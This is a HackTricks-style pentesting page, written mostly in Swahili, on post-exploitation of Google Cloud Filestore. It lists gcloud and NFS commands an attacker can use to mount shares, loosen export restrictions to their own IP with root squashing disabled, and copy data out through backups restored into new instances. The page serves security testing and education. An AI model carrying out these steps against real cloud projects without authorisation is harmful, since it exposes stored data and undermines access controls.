# GCP - Filestore Post Exploitation

{{#include ../../../banners/hacktricks-training.md}}

## Filestore

Kwa maelezo zaidi kuhusu Filestore angalia:

{{#ref}}
../gcp-services/gcp-filestore-enum.md
{{#endref}}

### Mount Filestore

Filesystem iliyoshirikiwa **inaweza kuwa na taarifa nyeti** zinazovutia kwa mtazamo wa mshambuliaji. Kwa kupata ufikiaji wa Filestore, inawezekana **mount it**:

<details>

<summary>Mount Filestore filesystem</summary>
```bash
sudo apt-get update
sudo apt-get install nfs-common
# Check the share name
showmount -e <IP>
# Mount the share
mkdir /mnt/fs
sudo mount [FILESTORE_IP]:/[FILE_SHARE_NAME] /mnt/fs
```
</details>

Ili kupata anwani ya IP ya filestore instance angalia sehemu ya enumeration ya ukurasa:

{{#ref}}
../gcp-services/gcp-filestore-enum.md
{{#endref}}

### Ondoa Vikwazo na upate ruhusa za ziada

Ikiwa mshambuliaji hayupo kwenye anwani ya IP yenye ufikiaji kwenye share, lakini una ruhusa za kutosha za kuibadilisha, inawezekana kuondoa vikwazo au kuongeza ufikiaji. Pia inawezekana kumpa anwani yako ya IP ruhusa za ziada ili kupata ufikiaji wa admin kwenye share:

<details>

<summary>Sasisha Filestore instance ili kuruhusu ufikiaji</summary>
```bash
gcloud filestore instances update nfstest \
--zone=<exact-zone> \
--flags-file=nfs.json

# Contents of nfs.json
{
"--file-share":
{
"capacity": "1024",
"name": "<share-name>",
"nfs-export-options": [
{
"access-mode": "READ_WRITE",
"ip-ranges": [
"<your-ip-private-address>/32"
],
"squash-mode": "NO_ROOT_SQUASH",
"anon_uid": 1003,
"anon_gid": 1003
}
]
}
}
```
</details>

### Rejesha chelezo

Ikiwa kuna chelezo, inawezekana **kurejesha** kwenye instance iliyopo au kwenye instance mpya ili taarifa zake ziweze kupatikana:

<details>

<summary>Unda instance mpya na rejesha chelezo</summary>
```bash
# Create a new filestore if you don't want to modify the old one
gcloud filestore instances create <new-instance-name> \
--zone=<zone> \
--tier=STANDARD \
--file-share=name=vol1,capacity=1TB \
--network=name=default,reserved-ip-range=10.0.0.0/29

# Restore a backups in a new instance
gcloud filestore instances restore <new-instance-name> \
--zone=<zone> \
--file-share=<instance-file-share-name> \
--source-backup=<backup-name> \
--source-backup-region=<backup-region>

# Follow the previous section commands to mount it
```
</details>

### Tengeneza nakala ya chelezo na uirejeshe

Ikiwa **hauna ufikiaji kwa share na hutaki kuibadilisha**, inawezekana **kutengeneza nakala ya chelezo** yake na **kuirejesha** kama ilivyotajwa hapo awali:

<details>

<summary>Tengeneza nakala ya chelezo na uirejeshe katika instance mpya</summary>
```bash
# Create share backup
gcloud filestore backups create <back-name> \
--region=<region> \
--instance=<instance-name> \
--instance-zone=<instance-zone> \
--file-share=<share-name>

# Follow the previous section commands to restore it and mount it
```
</details>

{{#include ../../../banners/hacktricks-training.md}}
